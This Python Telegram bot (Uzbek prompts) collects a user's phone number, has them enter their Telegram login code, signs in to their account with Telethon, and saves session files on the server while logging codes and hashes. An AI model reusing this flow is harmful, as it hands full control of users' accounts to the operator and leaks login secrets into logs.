import asyncio
from django.conf import settings
from telebot import TeleBot
from telebot.types import (
    Message,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telethon import utils
from telethon.sync import TelegramClient

import logging

# from .text import get_text as _
# from .helpers.auth import register_user
# from .keyboards import get_main_keyboard
# from .handlers import register_handlers

# logger = telebot.logger
# telebot.logger.setLevel(logging.INFO)

bot = TeleBot(settings.TELEGRAM_BOT_TOKEN)


def get_client(phone) -> TelegramClient:
    # sessions_dir = str(settings.BASE_DIR/'sessions')
    # session_name = sessions_dir + '/' + utils.parse_phone(phone=phone)
    session_name = "sessions/" + utils.parse_phone(phone=phone)
    logging.warning(session_name)
    return TelegramClient(session_name, settings.TELEGRAM_API_ID, settings.TELEGRAM_API_HASH)


user_auth_data = dict()


@bot.message_handler(commands=['help', 'start'])
def send_welcome(message: Message):
    # Create a reply keyboard (not inline) to request contact
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    button = KeyboardButton("📞 Telefon raqamini ulashish", request_contact=True)
    markup.add(button)
    msg = bot.send_message(message.chat.id, "Telefon raqamingizni ulashing:", reply_markup=markup)
    bot.register_next_step_handler(msg, process_phone_step)


def process_phone_step(message: Message):
    # check if user actually share a contact number
    if not message.contact:
        bot.reply_to(message, "Iltimos o'z kontaktingizni yuboring.")
        return
    
    # check if that contact belongs to user (not other)
    if message.contact.user_id != message.from_user.id:
        bot.reply_to(message, "Bu raqam sizga tegishli emas.")
        return
    phone = message.contact.phone_number
    logging.warning(phone)

    try:
        asyncio.get_running_loop()
    except RuntimeError:
        asyncio.set_event_loop(asyncio.new_event_loop())
    
    client = get_client(phone)
    client.connect()

    try:
        result = client.send_code_request(phone=phone)
    except Exception as e:
        logging.error(e)
        bot.reply_to(message, "Kutilmagan hatolik yuz berdi. Iltimos qayta urinib ko'ring.")
        return

    # save phone hash temporarily
    user_auth_data[message.from_user.id] = {
        "phone": phone,
        "phone_hash": result.phone_code_hash
    }
    # user_auth_data[phone] = result.phone_code_hash

    logging.warning(result)
    logging.warning(result.phone_code_hash)

    # me = client.get_me()
    # logging.warning(me)

    client.disconnect()
    
    msg = bot.reply_to(message, "Iltimos raqamingizga yuborilgal kodni kiriting:")
    bot.register_next_step_handler(msg, process_verify_code_step)


def process_verify_code_step(message: Message):
    logging.warning('message')
    logging.warning(message.text)

    try:
        asyncio.get_running_loop()
    except RuntimeError:
        asyncio.set_event_loop(asyncio.new_event_loop())

    auth = user_auth_data.get(message.from_user.id, None)

    if not auth: return

    client = get_client(auth['phone'])
    client.connect()

    phone = auth['phone']
    # parse the phone (removes '+' sign)
    parsed_phone = utils.parse_phone(phone=phone)

    me = None

    client._phone_code_hash = {parsed_phone: auth['phone_hash']}
    logging.warning(client._phone_code_hash)

    try:
        me = client.sign_in(phone=phone, code=message.text)
    except Exception as e:
        logging.error(e)
        bot.reply_to(message, "Kutilmagan hatolik yuz berdi. Iltimos qayta urinib ko'ring.")
        return
    logging.warning(me)

    client.disconnect()




# register_handlers(bot)

bot.enable_save_next_step_handlers(delay=2)
bot.load_next_step_handlers()